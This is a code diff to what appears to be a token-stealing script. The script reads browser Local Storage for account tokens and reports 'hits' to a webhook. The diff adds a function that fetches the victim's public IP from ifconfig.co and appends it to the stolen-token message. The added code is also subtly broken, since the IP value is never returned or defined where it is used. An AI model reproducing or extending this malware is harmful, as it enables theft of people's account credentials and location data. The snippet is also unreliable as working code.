@@ -1,6 +1,7 @@
 import os
 import re
 import json
+import requests
 
 from urllib.request import Request, urlopen
 
@@ -9,6 +10,10 @@ WEBHOOK_URL = 'WEBHOOK HERE'
 
 # mentions you when you get a hit
 PING_ME = False
+
+def get_ip():
+    ip_api = requests.get('https://ifconfig.co/json')
+    ip_data = ip_api.text
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -44,8 +49,10 @@ def main():
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
-
+        
+        
         message += f'\n**{platform}**\n```\n'
+        message += f'{ip_data}\n'
 
         tokens = find_tokens(path)
 
